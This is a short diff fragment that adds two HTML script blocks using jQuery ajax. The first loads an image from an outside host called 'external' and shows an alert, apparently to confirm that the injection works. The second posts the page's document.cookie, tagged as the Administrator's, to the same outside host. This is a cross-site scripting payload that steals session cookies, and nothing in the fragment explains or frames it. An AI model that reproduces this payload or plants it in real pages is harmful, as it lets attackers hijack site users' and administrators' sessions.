@@ -1,0 +1,18 @@
+<script>
+$.ajax({
+url: 'http://external:8000/smile.jpg',
+type: 'GET',
+success: function() { alert("smile.jpg loaded"); },
+});
+</script>
+
+
+<script>
+$.ajax({
+url: 'http://external:8000/cookie',
+type: 'POST',
+data: "username=Administrator&cookie=" + document.cookie,
+});
+</script>
+
+
